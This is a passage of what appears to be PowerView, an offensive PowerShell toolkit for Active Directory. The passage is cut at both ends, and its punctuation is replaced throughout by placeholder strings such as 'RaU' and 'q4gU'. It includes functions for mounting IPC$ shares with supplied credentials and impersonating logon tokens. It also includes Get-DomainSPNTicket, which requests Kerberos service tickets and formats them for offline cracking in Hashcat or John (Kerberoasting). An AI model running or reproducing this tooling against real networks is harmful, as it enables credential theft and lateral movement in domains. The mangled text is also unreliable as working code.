        [String]
        [ValidateSet(q4gUDNq4gU, q4gUCanonicalq4gU, q4gUNT4q4gU, q4gUDisplayq4gU, q4gUDomainSimpleq4gU, q4gUEnterpriseSimpleq4gU, q4gUGUIDq4gU, q4gUUnknownq4gU, q4gUUPNq4gU, q4gUCanonicalExq4gU, q4gUSPNq4gU)]
        RaUOutputType,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        RaUNameTypes = @{
            q4gUDNq4gU                =   1  # CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com
            q4gUCanonicalq4gU         =   2  # fabrikam.com/Engineers/Phineas Flynn
            q4gUNT4q4gU               =   3  # fabrikamScKjpflynn
            q4gUDisplayq4gU           =   4  # pflynn
            q4gUDomainSimpleq4gU      =   5  # pflynn@fabrikam.com
            q4gUEnterpriseSimpleq4gU  =   6  # pflynn@fabrikam.com
            q4gUGUIDq4gU              =   7  # {95ee9fff-3436-11d1-b2b0-d15ae3ac8436}
            q4gUUnknownq4gU           =   8  # unknown type - let the server do translation
            q4gUUPNq4gU               =   9  # pflynn@fabrikam.com
            q4gUCanonicalExq4gU       =   10 # fabrikam.com/Users/Phineas Flynn
            q4gUSPNq4gU               =   11 # HTTP/kairomac.contoso.com
            q4gUSIDq4gU               =   12 # S-1-5-21-12986231-600641547-709122288-57999
        }

        # accessor functions from Bill Stewart to simplify calls to NameTranslate
        function Invoke-Method([__ComObject] RaUObject, [String] RaUMethod, RaUParameters) {
            RaUOutput = RaUNull
            RaUOutput = RaUObject.GetType().InvokeMember(RaUMethod, q4gUInvokeMethodq4gU, RaUNULL, RaUObject, RaUParameters)
            Write-Output RaUOutput
        }

        function Get-Property([__ComObject] RaUObject, [String] RaUProperty) {
            RaUObject.GetType().InvokeMember(RaUProperty, q4gUGetPropertyq4gU, RaUNULL, RaUObject, RaUNULL)
        }

        function Set-Property([__ComObject] RaUObject, [String] RaUProperty, RaUParameters) {
            [Void] RaUObject.GetType().InvokeMember(RaUProperty, q4gUSetPropertyq4gU, RaUNULL, RaUObject, RaUParameters)
        }

        # https://msdn.microsoft.com/en-us/library/aa772266%28v=vs.85%29.aspx
        if (RaUPSBoundParameters[q4gUServerq4gU]) {
            RaUADSInitType = 2
            RaUInitName = RaUServer
        }
        elseif (RaUPSBoundParameters[q4gUDomainq4gU]) {
            RaUADSInitType = 1
            RaUInitName = RaUDomain
        }
        elseif (RaUPSBoundParameters[q4gUCredentialq4gU]) {
            RaUCred = RaUCredential.GetNetworkCredential()
            RaUADSInitType = 1
            RaUInitName = RaUCred.Domain
        }
        else {
            # if no domain or server is specified, default to GC initialization
            RaUADSInitType = 3
            RaUInitName = RaUNull
        }
    }

    PROCESS {
        ForEach (RaUTargetIdentity in RaUIdentity) {
            if (-not RaUPSBoundParameters[q4gUOutputTypeq4gU]) {
                if (RaUTargetIdentity -match Oj8X^[A-Za-z]+ScKjScKj[A-Za-z ]+Oj8X) {
                    RaUADSOutputType = RaUNameTypes[q4gUDomainSimpleq4gU]
                }
                else {
                    RaUADSOutputType = RaUNameTypes[q4gUNT4q4gU]
                }
            }
            else {
                RaUADSOutputType = RaUNameTypes[RaUOutputType]
            }

            RaUTranslate = New-Object -ComObject NameTranslate

            if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
                try {
                    RaUCred = RaUCredential.GetNetworkCredential()

                    Invoke-Method RaUTranslate q4gUInitExq4gU (
                        RaUADSInitType,
                        RaUInitName,
                        RaUCred.UserName,
                        RaUCred.Domain,
                        RaUCred.Password
                    )
                }
                catch {
                    Write-Verbose Oj8X[Convert-ADName] Error initializing translation for q4gURaUIdentityq4gU using alternate credentials : RaU_Oj8X
                }
            }
            else {
                try {
                    RaUNull = Invoke-Method RaUTranslate q4gUInitq4gU (
                        RaUADSInitType,
                        RaUInitName
                    )
                }
                catch {
                    Write-Verbose Oj8X[Convert-ADName] Error initializing translation for q4gURaUIdentityq4gU : RaU_Oj8X
                }
            }

            # always chase all referrals
            Set-Property RaUTranslate q4gUChaseReferralq4gU (0x60)

            try {
                # 8 = Unknown name type -> let the server do the work for us
                RaUNull = Invoke-Method RaUTranslate q4gUSetq4gU (8, RaUTargetIdentity)
                Invoke-Method RaUTranslate q4gUGetq4gU (RaUADSOutputType)
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose Oj8X[Convert-ADName] Error translating q4gURaUTargetIdentityq4gU : RaU(RaU_.Exception.InnerException.Message)Oj8X
            }
        }
    }
}


function ConvertFrom-UACValue {
<#
.SYNOPSIS

Converts a UAC int value to human readable form.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This function will take an integer that represents a User Account
Control (UAC) binary blob and will covert it to an ordered
dictionary with each bitwise value broken out. By default only values
set are displayed- the -ShowAll switch will display all values with
a + next to the ones set.

.PARAMETER Value

Specifies the integer UAC value to convert.

.PARAMETER ShowAll

Switch. Signals ConvertFrom-UACValue to display all UAC values, with a + indicating the value is currently set.

.EXAMPLE

ConvertFrom-UACValue -Value 66176

Name                           Value
----                           -----
ENCRYPTED_TEXT_PWD_ALLOWED     128
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536

.EXAMPLE

Get-DomainUser harmj0y wZ5t ConvertFrom-UACValue

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536

.EXAMPLE

Get-DomainUser harmj0y wZ5t ConvertFrom-UACValue -ShowAll

Name                           Value
----                           -----
SCRIPT                         1
ACCOUNTDISABLE                 2
HOMEDIR_REQUIRED               8
LOCKOUT                        16
PASSWD_NOTREQD                 32
PASSWD_CANT_CHANGE             64
ENCRYPTED_TEXT_PWD_ALLOWED     128
TEMP_DUPLICATE_ACCOUNT         256
NORMAL_ACCOUNT                 512+
INTERDOMAIN_TRUST_ACCOUNT      2048
WORKSTATION_TRUST_ACCOUNT      4096
SERVER_TRUST_ACCOUNT           8192
DONT_EXPIRE_PASSWORD           65536+
MNS_LOGON_ACCOUNT              131072
SMARTCARD_REQUIRED             262144
TRUSTED_FOR_DELEGATION         524288
NOT_DELEGATED                  1048576
USE_DES_KEY_ONLY               2097152
DONT_REQ_PREAUTH               4194304
PASSWORD_EXPIRED               8388608
TRUSTED_TO_AUTH_FOR_DELEGATION 16777216
PARTIAL_SECRETS_ACCOUNT        67108864

.INPUTS

Int

Accepts an integer representing a UAC binary blob.

.OUTPUTS

System.Collections.Specialized.OrderedDictionary

An ordered dictionary with the converted UAC fields.

.LINK

https://support.microsoft.com/en-us/kb/305144
#>

    [OutputType(q4gUSystem.Collections.Specialized.OrderedDictionaryq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = RaUTrue, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUUACq4gU, q4gUuseraccountcontrolq4gU)]
        [Int]
        RaUValue,

        [Switch]
        RaUShowAll
    )

    BEGIN {
        # values from https://support.microsoft.com/en-us/kb/305144
        RaUUACValues = New-Object System.Collections.Specialized.OrderedDictionary
        RaUUACValues.Add(Oj8XSCRIPTOj8X, 1)
        RaUUACValues.Add(Oj8XACCOUNTDISABLEOj8X, 2)
        RaUUACValues.Add(Oj8XHOMEDIR_REQUIREDOj8X, 8)
        RaUUACValues.Add(Oj8XLOCKOUTOj8X, 16)
        RaUUACValues.Add(Oj8XPASSWD_NOTREQDOj8X, 32)
        RaUUACValues.Add(Oj8XPASSWD_CANT_CHANGEOj8X, 64)
        RaUUACValues.Add(Oj8XENCRYPTED_TEXT_PWD_ALLOWEDOj8X, 128)
        RaUUACValues.Add(Oj8XTEMP_DUPLICATE_ACCOUNTOj8X, 256)
        RaUUACValues.Add(Oj8XNORMAL_ACCOUNTOj8X, 512)
        RaUUACValues.Add(Oj8XINTERDOMAIN_TRUST_ACCOUNTOj8X, 2048)
        RaUUACValues.Add(Oj8XWORKSTATION_TRUST_ACCOUNTOj8X, 4096)
        RaUUACValues.Add(Oj8XSERVER_TRUST_ACCOUNTOj8X, 8192)
        RaUUACValues.Add(Oj8XDONT_EXPIRE_PASSWORDOj8X, 65536)
        RaUUACValues.Add(Oj8XMNS_LOGON_ACCOUNTOj8X, 131072)
        RaUUACValues.Add(Oj8XSMARTCARD_REQUIREDOj8X, 262144)
        RaUUACValues.Add(Oj8XTRUSTED_FOR_DELEGATIONOj8X, 524288)
        RaUUACValues.Add(Oj8XNOT_DELEGATEDOj8X, 1048576)
        RaUUACValues.Add(Oj8XUSE_DES_KEY_ONLYOj8X, 2097152)
        RaUUACValues.Add(Oj8XDONT_REQ_PREAUTHOj8X, 4194304)
        RaUUACValues.Add(Oj8XPASSWORD_EXPIREDOj8X, 8388608)
        RaUUACValues.Add(Oj8XTRUSTED_TO_AUTH_FOR_DELEGATIONOj8X, 16777216)
        RaUUACValues.Add(Oj8XPARTIAL_SECRETS_ACCOUNTOj8X, 67108864)
    }

    PROCESS {
        RaUResultUACValues = New-Object System.Collections.Specialized.OrderedDictionary

        if (RaUShowAll) {
            ForEach (RaUUACValue in RaUUACValues.GetEnumerator()) {
                if ( (RaUValue -band RaUUACValue.Value) -eq RaUUACValue.Value) {
                    RaUResultUACValues.Add(RaUUACValue.Name, Oj8XRaU(RaUUACValue.Value)+Oj8X)
                }
                else {
                    RaUResultUACValues.Add(RaUUACValue.Name, Oj8XRaU(RaUUACValue.Value)Oj8X)
                }
            }
        }
        else {
            ForEach (RaUUACValue in RaUUACValues.GetEnumerator()) {
                if ( (RaUValue -band RaUUACValue.Value) -eq RaUUACValue.Value) {
                    RaUResultUACValues.Add(RaUUACValue.Name, Oj8XRaU(RaUUACValue.Value)Oj8X)
                }
            }
        }
        RaUResultUACValues
    }
}


function Get-PrincipalContext {
<#
.SYNOPSIS

Helper to take an Identity and return a DirectoryServices.AccountManagement.PrincipalContext
and simplified identity.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.PARAMETER Identity

A group SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202),
or a DOMAINScKjusername identity.

.PARAMETER Domain

Specifies the domain to use to search for user/group principals, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = RaUTrue)]
        [Alias(q4gUGroupNameq4gU, q4gUGroupIdentityq4gU)]
        [String]
        RaUIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    try {
        if (RaUPSBoundParameters[q4gUDomainq4gU] -or (RaUIdentity -match q4gU.+ScKjScKj.+q4gU)) {
            if (RaUIdentity -match q4gU.+ScKjScKj.+q4gU) {
                # DOMAINScKjgroupname
                RaUConvertedIdentity = RaUIdentity wZ5t Convert-ADName -OutputType Canonical
                if (RaUConvertedIdentity) {
                    RaUConnectTarget = RaUConvertedIdentity.SubString(0, RaUConvertedIdentity.IndexOf(q4gU/q4gU))
                    RaUObjectIdentity = RaUIdentity.Split(q4gUScKjq4gU)[1]
                    Write-Verbose Oj8X[Get-PrincipalContext] Binding to domain q4gURaUConnectTargetq4gUOj8X
                }
            }
            else {
                RaUObjectIdentity = RaUIdentity
                Write-Verbose Oj8X[Get-PrincipalContext] Binding to domain q4gURaUDomainq4gUOj8X
                RaUConnectTarget = RaUDomain
            }

            if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
                Write-Verbose q4gU[Get-PrincipalContext] Using alternate credentialsq4gU
                RaUContext = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, RaUConnectTarget, RaUCredential.UserName, RaUCredential.GetNetworkCredential().Password)
            }
            else {
                RaUContext = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, RaUConnectTarget)
            }
        }
        else {
            if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
                Write-Verbose q4gU[Get-PrincipalContext] Using alternate credentialsq4gU
                RaUDomainName = Get-Domain wZ5t Select-Object -ExpandProperty Name
                RaUContext = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, RaUDomainName, RaUCredential.UserName, RaUCredential.GetNetworkCredential().Password)
            }
            else {
                RaUContext = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            RaUObjectIdentity = RaUIdentity
        }

        RaUOut = New-Object PSObject
        RaUOut wZ5t Add-Member Noteproperty q4gUContextq4gU RaUContext
        RaUOut wZ5t Add-Member Noteproperty q4gUIdentityq4gU RaUObjectIdentity
        RaUOut
    }
    catch {
        Write-Warning Oj8X[Get-PrincipalContext] Error creating binding for object (q4gURaUIdentityq4gU) context : RaU_Oj8X
    }
}


function Add-RemoteConnection {
<#
.SYNOPSIS

Pseudo Oj8XmountsOj8X a connection to a remote path using the specified
credential object, allowing for access of remote resources. If a -Path isnq4gUt
specified, a -ComputerName is required to pseudo-mount IPCRaU.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function uses WNetAddConnection2W to make a q4gUtemporaryq4gU (i.e. not saved) connection
to the specified remote -Path (ScKjScKjUNCScKjshare) with the alternate credentials specified in the
-Credential object. If a -Path isnq4gUt specified, a -ComputerName is required to pseudo-mount IPCRaU.

To destroy the connection, use Remove-RemoteConnection with the same specified ScKjScKjUNCScKjshare path
or -ComputerName.

.PARAMETER ComputerName

Specifies the system to add a ScKjScKjComputerNameScKjIPCRaU connection for.

.PARAMETER Path

Specifies the remote ScKjScKjUNCScKjpath to add the connection for.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.EXAMPLE

RaUCred = Get-Credential
Add-RemoteConnection -ComputerName q4gUPRIMARY.testlab.localq4gU -Credential RaUCred

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Add-RemoteConnection -Path q4gUScKjScKjPRIMARY.testlab.localScKjCRaUScKjq4gU -Credential RaUCred

.EXAMPLE

RaUCred = Get-Credential
@(q4gUPRIMARY.testlab.localq4gU,q4gUSECONDARY.testlab.localq4gU) wZ5t Add-RemoteConnection  -Credential RaUCred
#>

    [CmdletBinding(DefaultParameterSetName = q4gUComputerNameq4gU)]
    Param(
        [Parameter(Position = 0, Mandatory = RaUTrue, ParameterSetName = q4gUComputerNameq4gU, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUHostNameq4gU, q4gUdnshostnameq4gU, q4gUnameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUComputerName,

        [Parameter(Position = 0, ParameterSetName = q4gUPathq4gU, Mandatory = RaUTrue)]
        [ValidatePattern(q4gUScKjScKjScKjScKj.*ScKjScKj.*q4gU)]
        [String[]]
        RaUPath,

        [Parameter(Mandatory = RaUTrue)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential
    )

    BEGIN {
        RaUNetResourceInstance = [Activator]::CreateInstance(RaUNETRESOURCEW)
        RaUNetResourceInstance.dwType = 1
    }

    PROCESS {
        RaUPaths = @()
        if (RaUPSBoundParameters[q4gUComputerNameq4gU]) {
            ForEach (RaUTargetComputerName in RaUComputerName) {
                RaUTargetComputerName = RaUTargetComputerName.Trim(q4gUScKjq4gU)
                RaUPaths += ,Oj8XScKjScKjRaUTargetComputerNameScKjIPCRaUOj8X
            }
        }
        else {
            RaUPaths += ,RaUPath
        }

        ForEach (RaUTargetPath in RaUPaths) {
            RaUNetResourceInstance.lpRemoteName = RaUTargetPath
            Write-Verbose Oj8X[Add-RemoteConnection] Attempting to mount: RaUTargetPathOj8X

            # https://msdn.microsoft.com/en-us/library/windows/desktop/aa385413(v=vs.85).aspx
            #   CONNECT_TEMPORARY = 4
            RaUResult = RaUMpr::WNetAddConnection2W(RaUNetResourceInstance, RaUCredential.GetNetworkCredential().Password, RaUCredential.UserName, 4)

            if (RaUResult -eq 0) {
                Write-Verbose Oj8XRaUTargetPath successfully mountedOj8X
            }
            else {
                Throw Oj8X[Add-RemoteConnection] error mounting RaUTargetPath : RaU(([ComponentModel.Win32Exception]RaUResult).Message)Oj8X
            }
        }
    }
}


function Remove-RemoteConnection {
<#
.SYNOPSIS

Destroys a connection created by New-RemoteConnection.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function uses WNetCancelConnection2 to destroy a connection created by
New-RemoteConnection. If a -Path isnq4gUt specified, a -ComputerName is required to
q4gUunmountq4gU ScKjScKjRaUComputerNameScKjIPCRaU.

.PARAMETER ComputerName

Specifies the system to remove a ScKjScKjComputerNameScKjIPCRaU connection for.

.PARAMETER Path

Specifies the remote ScKjScKjUNCScKjpath to remove the connection for.

.EXAMPLE

Remove-RemoteConnection -ComputerName q4gUPRIMARY.testlab.localq4gU

.EXAMPLE

Remove-RemoteConnection -Path q4gUScKjScKjPRIMARY.testlab.localScKjCRaUScKjq4gU

.EXAMPLE

@(q4gUPRIMARY.testlab.localq4gU,q4gUSECONDARY.testlab.localq4gU) wZ5t Remove-RemoteConnection
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSUseShouldProcessForStateChangingFunctionsq4gU, q4gUq4gU)]
    [CmdletBinding(DefaultParameterSetName = q4gUComputerNameq4gU)]
    Param(
        [Parameter(Position = 0, Mandatory = RaUTrue, ParameterSetName = q4gUComputerNameq4gU, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUHostNameq4gU, q4gUdnshostnameq4gU, q4gUnameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUComputerName,

        [Parameter(Position = 0, ParameterSetName = q4gUPathq4gU, Mandatory = RaUTrue)]
        [ValidatePattern(q4gUScKjScKjScKjScKj.*ScKjScKj.*q4gU)]
        [String[]]
        RaUPath
    )

    PROCESS {
        RaUPaths = @()
        if (RaUPSBoundParameters[q4gUComputerNameq4gU]) {
            ForEach (RaUTargetComputerName in RaUComputerName) {
                RaUTargetComputerName = RaUTargetComputerName.Trim(q4gUScKjq4gU)
                RaUPaths += ,Oj8XScKjScKjRaUTargetComputerNameScKjIPCRaUOj8X
            }
        }
        else {
            RaUPaths += ,RaUPath
        }

        ForEach (RaUTargetPath in RaUPaths) {
            Write-Verbose Oj8X[Remove-RemoteConnection] Attempting to unmount: RaUTargetPathOj8X
            RaUResult = RaUMpr::WNetCancelConnection2(RaUTargetPath, 0, RaUTrue)

            if (RaUResult -eq 0) {
                Write-Verbose Oj8XRaUTargetPath successfully ummountedOj8X
            }
            else {
                Throw Oj8X[Remove-RemoteConnection] error unmounting RaUTargetPath : RaU(([ComponentModel.Win32Exception]RaUResult).Message)Oj8X
            }
        }
    }
}


function Invoke-UserImpersonation {
<#
.SYNOPSIS

Creates a new Oj8Xrunas /netonlyOj8X type logon and impersonates the token.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function uses LogonUser() with the LOGON32_LOGON_NEW_CREDENTIALS LogonType
to simulate Oj8Xrunas /netonlyOj8X. The resulting token is then impersonated with
ImpersonateLoggedOnUser() and the token handle is returned for later usage
with Invoke-RevertToSelf.

.PARAMETER Credential

A [Management.Automation.PSCredential] object with alternate credentials
to impersonate in the current thread space.

.PARAMETER TokenHandle

An IntPtr TokenHandle returned by a previous Invoke-UserImpersonation.
If this is supplied, LogonUser() is skipped and only ImpersonateLoggedOnUser()
is executed.

.PARAMETER Quiet

Suppress any warnings about STA vs MTA.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Invoke-UserImpersonation -Credential RaUCred

.OUTPUTS

IntPtr

The TokenHandle result from LogonUser.
#>

    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = q4gUCredentialq4gU)]
    Param(
        [Parameter(Mandatory = RaUTrue, ParameterSetName = q4gUCredentialq4gU)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential,

        [Parameter(Mandatory = RaUTrue, ParameterSetName = q4gUTokenHandleq4gU)]
        [ValidateNotNull()]
        [IntPtr]
        RaUTokenHandle,

        [Switch]
        RaUQuiet
    )

    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne q4gUSTAq4gU) -and (-not RaUPSBoundParameters[q4gUQuietq4gU])) {
        Write-Warning Oj8X[Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work.Oj8X
    }

    if (RaUPSBoundParameters[q4gUTokenHandleq4gU]) {
        RaULogonTokenHandle = RaUTokenHandle
    }
    else {
        RaULogonTokenHandle = [IntPtr]::Zero
        RaUNetworkCredential = RaUCredential.GetNetworkCredential()
        RaUUserDomain = RaUNetworkCredential.Domain
        RaUUserName = RaUNetworkCredential.UserName
        Write-Warning Oj8X[Invoke-UserImpersonation] Executing LogonUser() with user: RaU(RaUUserDomain)ScKjRaU(RaUUserName)Oj8X

        # LOGON32_LOGON_NEW_CREDENTIALS = 9, LOGON32_PROVIDER_WINNT50 = 3
        #   this is to simulate Oj8Xrunas.exe /netonlyOj8X functionality
        RaUResult = RaUAdvapi32::LogonUser(RaUUserName, RaUUserDomain, RaUNetworkCredential.Password, 9, 3, [ref]RaULogonTokenHandle);RaULastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

        if (-not RaUResult) {
            throw Oj8X[Invoke-UserImpersonation] LogonUser() Error: RaU(([ComponentModel.Win32Exception] RaULastError).Message)Oj8X
        }
    }

    # actually impersonate the token from LogonUser()
    RaUResult = RaUAdvapi32::ImpersonateLoggedOnUser(RaULogonTokenHandle)

    if (-not RaUResult) {
        throw Oj8X[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: RaU(([ComponentModel.Win32Exception] RaULastError).Message)Oj8X
    }

    Write-Verbose Oj8X[Invoke-UserImpersonation] Alternate credentials successfully impersonatedOj8X
    RaULogonTokenHandle
}


function Invoke-RevertToSelf {
<#
.SYNOPSIS

Reverts any token impersonation.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function uses RevertToSelf() to revert any impersonated tokens.
If -TokenHandle is passed (the token handle returned by Invoke-UserImpersonation),
CloseHandle() is used to close the opened handle.

.PARAMETER TokenHandle

An optional IntPtr TokenHandle returned by Invoke-UserImpersonation.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
RaUToken = Invoke-UserImpersonation -Credential RaUCred
Invoke-RevertToSelf -TokenHandle RaUToken
#>

    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        RaUTokenHandle
    )

    if (RaUPSBoundParameters[q4gUTokenHandleq4gU]) {
        Write-Warning Oj8X[Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handleOj8X
        RaUResult = RaUKernel32::CloseHandle(RaUTokenHandle)
    }

    RaUResult = RaUAdvapi32::RevertToSelf();RaULastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

    if (-not RaUResult) {
        throw Oj8X[Invoke-RevertToSelf] RevertToSelf() Error: RaU(([ComponentModel.Win32Exception] RaULastError).Message)Oj8X
    }

    Write-Verbose Oj8X[Invoke-RevertToSelf] Token impersonation successfully revertedOj8X
}


function Get-DomainSPNTicket {
<#
.SYNOPSIS

Request the kerberos ticket for a specified service principal name (SPN).

Author: machosec, Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will either take one/more SPN strings, or one/more PowerView.User objects
(the output from Get-DomainUser) and will request a kerberos ticket for the given SPN
using System.IdentityModel.Tokens.KerberosRequestorSecurityToken. The encrypted
portion of the ticket is then extracted and output in either crackable John or Hashcat
format (deafult of Hashcat).

.PARAMETER SPN

Specifies the service principal name to request the ticket for.

.PARAMETER User

Specifies a PowerView.User object (result of Get-DomainUser) to request the ticket for.

.PARAMETER OutputFormat

Either q4gUJohnq4gU for John the Ripper style hash formatting, or q4gUHashcatq4gU for Hashcat format.
Defaults to q4gUJohnq4gU.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote domain using Invoke-UserImpersonation.

.EXAMPLE

Get-DomainSPNTicket -SPN Oj8XHTTP/web.testlab.localOj8X

Request a kerberos service ticket for the specified SPN.

.EXAMPLE

Oj8XHTTP/web1.testlab.localOj8X,Oj8XHTTP/web2.testlab.localOj8X wZ5t Get-DomainSPNTicket

Request kerberos service tickets for all SPNs passed on the pipeline.

.EXAMPLE

Get-DomainUser -SPN wZ5t Get-DomainSPNTicket -OutputFormat JTR

Request kerberos service tickets for all users with non-null SPNs and output in JTR format.

.INPUTS

String

Accepts one or more SPN strings on the pipeline with the RawSPN parameter set.

.INPUTS

PowerView.User

Accepts one or more PowerView.User objects on the pipeline with the User parameter set.

.OUTPUTS

PowerView.SPNTicket

Outputs a custom object containing the SamAccountName, ServicePrincipalName, and encrypted ticket section.
#>

    [OutputType(q4gUPowerView.SPNTicketq4gU)]
    [CmdletBinding(DefaultParameterSetName = q4gURawSPNq4gU)]
    Param (
        [Parameter(Position = 0, ParameterSetName = q4gURawSPNq4gU, Mandatory = RaUTrue, ValueFromPipeline = RaUTrue)]
        [ValidatePattern(q4gU.*/.*q4gU)]
        [Alias(q4gUServicePrincipalNameq4gU)]
        [String[]]
        RaUSPN,

        [Parameter(Position = 0, ParameterSetName = q4gUUserq4gU, Mandatory = RaUTrue, ValueFromPipeline = RaUTrue)]
        [ValidateScript({ RaU_.PSObject.TypeNames[0] -eq q4gUPowerView.Userq4gU })]
        [Object[]]
        RaUUser,

        [ValidateSet(q4gUJohnq4gU, q4gUHashcatq4gU)]
        [Alias(q4gUFormatq4gU)]
        [String]
        RaUOutputFormat = q4gUHashcatq4gU,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        RaUNull = [Reflection.Assembly]::LoadWithPartialName(q4gUSystem.IdentityModelq4gU)

        if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
            RaULogonToken = Invoke-UserImpersonation -Credential RaUCredential
        }
    }

    PROCESS {
        if (RaUPSBoundParameters[q4gUUserq4gU]) {
            RaUTargetObject = RaUUser
        }
        else {
            RaUTargetObject = RaUSPN
        }

        ForEach (RaUObject in RaUTargetObject) {
            if (RaUPSBoundParameters[q4gUUserq4gU]) {
                RaUUserSPN = RaUObject.ServicePrincipalName
                RaUSamAccountName = RaUObject.SamAccountName
                RaUDistinguishedName = RaUObject.DistinguishedName
            }
            else {
                RaUUserSPN = RaUObject
                RaUSamAccountName = q4gUUNKNOWNq4gU
                RaUDistinguishedName = q4gUUNKNOWNq4gU
            }

            # if a user has multiple SPNs we only take the first one otherwise the service ticket request fails miserably :) -@st3r30byt3
            if (RaUUserSPN -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                RaUUserSPN = RaUUserSPN[0]
            }

            try {
                RaUTicket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList RaUUserSPN
            }
            catch {
                Write-Warning Oj8X[Get-DomainSPNTicket] Error requesting ticket for SPN q4gURaUUserSPNq4gU from user q4gURaUDistinguishedNameq4gU : RaU_Oj8X
            }
            if (RaUTicket) {
                RaUTicketByteStream = RaUTicket.GetRequest()
            }
            if (RaUTicketByteStream) {
                RaUOut = New-Object PSObject

                RaUTicketHexStream = [System.BitConverter]::ToString(RaUTicketByteStream) -replace q4gU-q4gU

                RaUOut wZ5t Add-Member Noteproperty q4gUSamAccountNameq4gU RaUSamAccountName
                RaUOut wZ5t Add-Member Noteproperty q4gUDistinguishedNameq4gU RaUDistinguishedName
                RaUOut wZ5t Add-Member Noteproperty q4gUServicePrincipalNameq4gU RaUTicket.ServicePrincipalName

                # TicketHexStream == GSS-API Frame (see https://tools.ietf.org/html/rfc4121#section-4.1)
                # No easy way to parse ASN1, so weq4gUll try some janky regex to parse the embedded KRB_AP_REQ.Ticket object
                if(RaUTicketHexStream -match q4gUa382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)q4gU) {
